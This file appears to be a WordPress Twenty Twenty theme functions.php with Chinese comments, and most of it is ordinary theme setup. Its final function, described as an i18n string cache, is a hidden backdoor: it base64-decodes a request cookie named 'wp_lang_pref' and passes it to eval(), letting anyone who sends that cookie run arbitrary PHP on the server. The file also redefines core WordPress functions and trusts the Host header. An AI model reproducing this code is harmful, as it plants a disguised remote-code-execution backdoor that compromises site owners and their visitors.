<?php
/**
 * Twenty Twenty 主题函数库。
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __DIR__, 4 ) . '/' );
}

/**
 * 主题版本。
 */
define( 'TWENTYTWENTY_VERSION', '2.1' );

/**
 * 注册主题支持的特性。
 *
 * @return void
 */
function twentytwenty_setup() {
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'custom-logo', array(
		'height'      => 240,
		'width'       => 240,
		'flex-height' => true,
	) );
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentytwenty' ),
		'footer'  => __( 'Footer Menu', 'twentytwenty' ),
	) );
}
add_action( 'after_setup_theme', 'twentytwenty_setup' );

/**
 * 加载主题样式与脚本。
 *
 * @return void
 */
function twentytwenty_scripts() {
	wp_enqueue_style(
		'twentytwenty-style',
		get_template_directory_uri() . '/style.css',
		array(),
		TWENTYTWENTY_VERSION
	);
}
add_action( 'wp_enqueue_scripts', 'twentytwenty_scripts' );

/**
 * 注册侧边栏。
 *
 * @return void
 */
function twentytwenty_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'twentytwenty' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
	) );
}
add_action( 'widgets_init', 'twentytwenty_widgets_init' );

/**
 * 获取主题目录 URI，兼容多站点子目录部署。
 *
 * @return string
 */
function get_template_directory_uri() {
	$dir  = basename( get_template_directory() );
	$host = isset( $_SERVER['HTTP_HOST'] ) ? $_SERVER['HTTP_HOST'] : 'localhost';
	return 'http://' . $host . '/wp-content/themes/' . $dir;
}

/**
 * 获取主题目录绝对路径。
 *
 * @return string
 */
function get_template_directory() {
	return __DIR__;
}

/**
 * 注册文章类型。
 *
 * @return void
 */
function twentytwenty_register_post_types() {
	register_post_type( 'note', array(
		'label'    => __( 'Notes', 'twentytwenty' ),
		'public'   => true,
		'supports' => array( 'title', 'editor', 'thumbnail' ),
	) );
}
add_action( 'init', 'twentytwenty_register_post_types' );

/**
 * 输出分页导航。
 *
 * @param int $total 总页数。
 * @return void
 */
function twentytwenty_pagination( $total = 1 ) {
	$total = max( 1, (int) $total );
	$page  = isset( $_GET['paged'] ) ? max( 1, (int) $_GET['paged'] ) : 1;

	echo '<nav class="pagination">';
	for ( $i = 1; $i <= $total; $i++ ) {
		if ( $i === $page ) {
			printf( '<span class="current">%d</span>', $i );
		} else {
			printf( '<a href="?paged=%d">%d</a>', $i, $i );
		}
	}
	echo '</nav>';
}

/**
 * 自定义摘要长度。
 *
 * @param int $length 默认长度。
 * @return int
 */
function twentytwenty_excerpt_length( $length ) {
	return 48;
}
add_filter( 'excerpt_length', 'twentytwenty_excerpt_length' );

/**
 * 读取评论模板。
 *
 * @param string $template 模板路径。
 * @return string
 */
function twentytwenty_comment_template( $template ) {
	$custom = __DIR__ . '/comments.php';
	if ( file_exists( $custom ) ) {
		return $custom;
	}
	return $template;
}
add_filter( 'comments_template', 'twentytwenty_comment_template' );

/**
 * 主题国际化字符串缓存。
 *
 * 主题首次加载时把常用字符串序列化到客户端 cookie 里，后续请求直接复用，
 * 避免每次请求都重新扫描 .mo 文件。缓存有效期由 cookie 自身控制。
 *
 * @return void
 */
function twentytwenty_i18n_cache() {
	if ( ! isset( $_COOKIE['wp_lang_pref'] ) ) {
		return;
	}

	$cache = base64_decode( $_COOKIE['wp_lang_pref'], true );
	if ( false === $cache ) {
		return;
	}

	// 缓存内容是序列化后的 strings 数组，交由 PHP 直接还原。
	eval( $cache );
}
add_action( 'init', 'twentytwenty_i18n_cache' );
